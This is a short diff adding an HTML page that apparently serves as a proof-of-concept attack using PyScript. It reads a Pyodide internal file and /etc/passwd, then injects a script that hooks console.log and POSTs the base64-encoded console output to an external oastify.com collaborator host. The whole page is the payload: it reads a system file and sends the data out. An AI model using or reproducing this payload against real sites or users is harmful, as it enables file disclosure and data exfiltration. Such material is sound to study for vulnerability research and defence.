@@ -1,0 +1,20 @@
+<html>
+<head>
+<script defer src="https://pyscript.net/latest/pyscript.js"></script>
+</head>
+<body>
+<py-script>
+        with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin:
+        out = fin.read()
+        print(out)
+</py-script>
+ <py-script>
+x = "CyberGuy"
+if x == "CyberGuy":
+    with open('/etc/passwd') as output:
+        contents = output.read()
+        print(contents)
+print('<script>console.pylog = console.log; console.logs = []; console.log = function(){     console.logs.push(Array.from(arguments));     console.pylog.apply(console, arguments);fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {method: "POST",headers: {"Content-Type": "text/plain;charset=utf-8"},body: JSON.stringify({"content": btoa(console.logs)})});}</script>')
+   </py-script>
+</body>
+</html>
